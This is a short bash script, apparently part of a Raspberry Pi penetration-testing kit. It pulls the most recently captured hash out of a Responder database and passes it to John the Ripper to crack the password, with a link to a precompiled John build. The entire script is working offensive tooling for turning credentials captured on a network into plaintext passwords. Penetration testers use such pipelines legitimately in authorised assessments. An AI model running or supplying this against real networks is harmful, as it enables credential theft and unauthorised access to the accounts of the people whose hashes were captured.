#!/bin/bash
#
# Extract (last) captured hash from Responder.db and hand it over to JtR jumbo for cracking
# precompiled JtR jumbo: https://github.com/mame82/john-1-8-0-jumbo_raspbian_jessie_precompiled

# Warning, ordering is based on timestamp. It has to be assured that after reboot the date isn't 
# set to something earlier.
sqlite3 -line Responder/Responder.db "select * from responder ORDER BY 1 DESC LIMIT 1"  | grep fullhash | cut -d" " -f4 > /tmp/last.hash
/home/pi/john/john /tmp/last.hash
echo $?
/home/pi/john/john --show /tmp/last.hash
